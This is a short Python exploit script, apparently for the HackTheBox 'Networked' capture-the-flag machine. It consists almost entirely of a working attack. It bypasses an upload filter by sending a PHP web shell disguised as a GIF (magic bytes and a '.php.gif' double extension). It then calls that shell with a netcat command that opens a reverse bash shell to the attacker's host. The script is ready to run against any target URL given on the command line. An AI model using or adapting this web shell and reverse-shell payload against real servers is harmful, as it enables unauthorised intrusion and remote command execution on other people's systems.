# Hackthebox networked file upload exploit 
# Date: Nov 17, 2022

import requests
import sys

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_file_upload(url,lhost,lport):
    upload_path = "/upload.php"
    GIF_magicBytes = 'GIF8;'
    files = {'myFile': ('test.php.gif',GIF_magicBytes+'\n'+'<?php echo shell_exec($_GET["cmd"]); ?>','image/gif',{'Content-Disposition': 'form-data'})}
    data = {'submit':'submit'}
    r = requests.post(url + upload_path,files=files,data=data,proxies=proxies,verify=False,timeout=30)
    if "uploaded" in r.text:
        print("Exploit uploaded Successfully")
        print("Executing reverse shell.Check your netcat listener !!")
        ip_modified = lhost.replace(".","_")
        execute_payload = url + "/uploads/" + ip_modified + ".php.gif?cmd=nc -nv " + lhost + " " + lport + " -e /bin/bash"
        r = requests.get(execute_payload,proxies=proxies,verify=False)
    else:
        print("Exploit upload failed. Something went wrong !!")
def main():
    if len(sys.argv) != 4:
        print("(+)Usage: %s <url> <lhost> <lport>" % sys.argv[0])
        print("(+)Example: %s http://10.10.10.146 10.10.10.14.2 4444" % sys.argv[0])
        sys.exit()
    else:
        target_url = sys.argv[1]
        if not (target_url.startswith('http')):
            print("Target must start with http or https.")
            sys.exit()
        if (target_url.endswith("/")):
            url=target_url.rstrip("/")
        else:
            url=target_url
        lhost = sys.argv[2]
        lport = sys.argv[3]
        exploit_file_upload(url,lhost,lport)
if __name__ == "__main__":
    main()


